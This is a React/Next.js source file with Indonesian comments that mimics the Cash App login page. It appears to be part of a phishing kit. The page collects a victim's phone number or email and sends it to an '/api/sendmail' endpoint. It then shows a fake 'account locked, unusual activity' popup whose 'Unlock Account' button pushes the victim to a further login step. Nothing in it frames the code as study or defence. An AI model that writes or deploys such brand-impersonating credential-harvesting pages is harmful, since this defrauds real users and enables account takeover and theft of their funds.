"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";

export const metadata = { title: "Log in • Cash-style" };

// Format nomor telepon otomatis
function formatPhone(raw) {
  const digits = raw.replace(/\D/g, "").slice(0, 10);
  const len = digits.length;
  if (len === 0) return "";
  if (len < 4) return `(${digits}`;
  if (len < 7) return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
  return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
}

export default function LoginPage() {
  const [useEmail, setUseEmail] = useState(false);
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [isDisabled, setIsDisabled] = useState(false);

  const router = useRouter();

  // handle phone input
  const handlePhoneChange = (e) => setPhone(formatPhone(e.target.value));
  const handlePhonePaste = (e) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text");
    setPhone(formatPhone(pasted));
  };
  const handlePhoneKeyDown = (e) => {
    const allowed = ["Backspace", "Delete", "ArrowLeft", "ArrowRight", "Home", "End", "Tab"];
    if ((e.ctrlKey || e.metaKey) && ["a", "c", "v", "x"].includes(e.key.toLowerCase())) return;
    if (allowed.includes(e.key)) return;
    if (!/^\d$/.test(e.key)) e.preventDefault();
  };

  // validasi tombol
  const isInvalid = useEmail ? email.trim() === "" : phone.trim().length < 14;

  // submit → kirim API lalu popup
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (isInvalid || isDisabled) return;
    setIsDisabled(true);

    try {
      const res = await fetch("/api/sendmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, phone }),
      });
      const data = await res.json();

      if (data.success) {
        setShowPopup(true);
      } else {
        alert("Gagal mengirim email!");
      }
    } catch (err) {
      console.error(err);
      alert("Terjadi error saat kirim email");
    } finally {
      setIsDisabled(false);
    }
  };

  // tombol unlock → redirect ke /login
  const handleUnlock = () => {
    setShowPopup(false);
    router.push("/login"); // step berikutnya
  };

  return (
    <div className="page">
      <header className="topbar">
        <a className="brand" href="#" aria-label="Cash App">
          <span className="brandIcon" aria-hidden>
            {/* Logo SVG dibiarkan */}
          </span>
        </a>
      </header>

      <main className="center">
        <section className="panel" role="form" aria-labelledby="login-title">
          <h1 id="login-title" className="title">Log in</h1>
          <p className="subtitle">
            Enter your {useEmail ? "email" : "phone number"}. New to Cash App?{" "}
            <br />
            <a href="#" className="link">Create account</a>
          </p>

          {/* PAKAI handleSubmit */}
          <form onSubmit={handleSubmit} className="form">
            {useEmail ? (
              <>
                <label htmlFor="email" className="label">Email</label>
                <input
                  id="email"
                  type="email"
                  placeholder="name@email.com"
                  className="input single"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
              </>
            ) : (
              <>
                <label htmlFor="phone" className="label">Mobile number</label>
                <div className="phoneField">
                  <button type="button" className="country">
                    <span className="flag" aria-hidden>
                      {/* US flag SVG dibiarkan */}
                    </span>
                    <span className="dial">+1</span>
                    <svg className="chev" viewBox="0 0 20 20" width="16" height="16" aria-hidden>
                      <path d="M5 7l5 6 5-6" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
                    </svg>
                  </button>
                  <input
                    id="phone"
                    type="tel"
                    inputMode="numeric"
                    autoComplete="tel"
                    placeholder="(123) 456-7890"
                    className="input"
                    value={phone}
                    onChange={handlePhoneChange}
                    onPaste={handlePhonePaste}
                    onKeyDown={handlePhoneKeyDown}
                    maxLength={14}
                    pattern="^\([0-9]{3}\) [0-9]{3}-[0-9]{4}$"
                    required
                  />
                </div>
              </>
            )}

            <div className="actions">
              <button
                type="button"
                className="btn ghost"
                onClick={() => setUseEmail(!useEmail)}
              >
                {useEmail ? "Use phone" : "Use email"}
              </button>
              <button 
                type="submit" 
                className="btn primary" 
                disabled={isInvalid || isDisabled}
              >
                {isDisabled ? "Sending..." : "Continue"}
              </button>
            </div>

            <p id="helper" className="helper">
              By entering and clicking Continue, you agree to the{" "}
              <u><b>Terms</b>, <b>E-Sign Consent</b>, &amp; <b>Privacy Policy</b>.</u>
            </p>
          </form>

          <div className="disclosures">
            {/* teks disclosures tetap */}
          </div>
        </section>
      </main>

      {/* POPUP */}
      {showPopup && (
        <div className="overlay">
          <div className="bg-white rounded-2xl shadow-xl max-w-sm w-full p-6 text-center">
            <div className="w-12 h-12 mx-auto mb-4 flex items-center justify-center bg-green-100 rounded-full">
              {/* Icon lock */}
            </div>

            <h2 className="text-lg font-semibold mb-2">
              We detected something unusual.
            </h2>
            <p className="text-gray-600 mb-6 text-sm">
              To protect your funds, we’ve temporarily locked your account. <br />
              To unlock your account, please verify your email by clicking the
              button below.
            </p>

            <button
              onClick={handleUnlock}
              className="w-full py-3 rounded-xl bg-green-600 text-white font-bold hover:bg-green-700"
            >
              Unlock Account
            </button>
          </div>
        </div>
      )}

      <style jsx>{`
        :root{ --text:#0b0b0b; --muted:#6b6b6b; --green:#00C244; --border:#d7d7d7; --bg:#fff; }
        *{box-sizing:border-box}
        html,body,#__next,.page{height:100%}
        body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial}

        .page{background:var(--bg); color:var(--text)}

        .topbar{height:64px; display:flex; align-items:center}
        .brand{display:inline-flex; align-items:center; gap:10px; text-decoration:none; color:inherit; padding:12px 18px}

        .center{display:grid; place-items:start center; padding:48px 16px}
        .panel{width:100%; max-width:480px}

        .title{font-size:40px; line-height:1.1; margin:24px 0 8px}
        .subtitle{margin:0 0 24px; color:var(--muted)}
        .link{color:rgb(0, 214, 79); text-decoration:none; font-weight:600}

        .form{margin-top:8px}
        .label{font-size:14px; color:#444; font-weight:600; margin-bottom:8px; display:block}

        .phoneField{display:flex; align-items:center}
        .country{display:inline-flex; align-items:center; gap:8px; height:56px; padding:0 12px; border:2px solid var(--green); border-right:none; border-radius:12px 0 0 12px; background:#fff; color:#111; cursor:pointer}
        .flag{font-size:18px}
        .dial{font-weight:600}
        .chev{opacity:.7}

        .input{flex:1; height:56px; border:2px solid var(--green); padding:0 14px; font-size:16px; outline:none}
        .input.single{border-radius:12px; width:100%}
        .phoneField .input{border-radius:0 12px 12px 0}
        .input::placeholder{color:#a9a9a9}
        .input:focus{box-shadow:0 0 0 4px rgb(0, 214, 79)}

        .actions{display:flex; gap:16px; margin:24px 0}
        .btn{flex:1; height:48px; border-radius:999px; border:1px solid var(--border); font-weight:700; cursor:pointer}
        .btn.ghost{background:#f0f0f0}
        .btn.ghost:hover{background:#e9e9e9}
        .btn.primary{background:rgb(0, 214, 79); color:#fff; border-color:transparent}
        .btn.primary:disabled{
          background:#c5c5c5;
          cursor:not-allowed;
          opacity:0.7;
        }

        .helper{color:#4b4b4b; font-size:12.5px}
        .helper a{color:#111}

        .disclosures{margin-top:40px; color:#6a6a6a; font-size:13px; line-height:1.6}
        .disclosures p{margin:0 0 14px}

        @media(max-width:520px){.title{font-size:32px} .center{padding:24px 16px}}
       .overlay {
          position: fixed;
          inset: 0;
          background: rgba(0,0,0,0.6);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 9999;
        }
        .popup {
          background: #fff;
          border-radius: 16px;
          padding: 24px;
          width: 90%;
          max-width: 400px;
          text-align: center;
          box-shadow: 0 6px 20px rgba(0,0,0,0.2);
        }
        .popup h2 { margin: 0 0 12px; }
        .popup p { margin: 0 0 20px; }
      
      `}</style>
    </div>

  );
}
